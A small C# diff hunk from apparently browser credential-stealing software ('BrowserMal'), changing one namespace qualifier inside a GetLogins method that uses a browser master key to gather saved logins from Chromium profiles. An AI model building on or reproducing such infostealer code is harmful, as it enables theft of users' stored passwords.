@@ -48,7 +48,7 @@ namespace BrowserMal.Manager
 
         private List<T> GetLogins(string path, byte[] masterKey, string profileType)
         {
-            List<string> profiles = Browser.ChromiumUtil.GetAllProfiles(path, profileType);
+            List<string> profiles = ChromiumUtil.GetAllProfiles(path, profileType);
             List<T> creds = new List<T>();
 
             foreach (string profile in profiles)
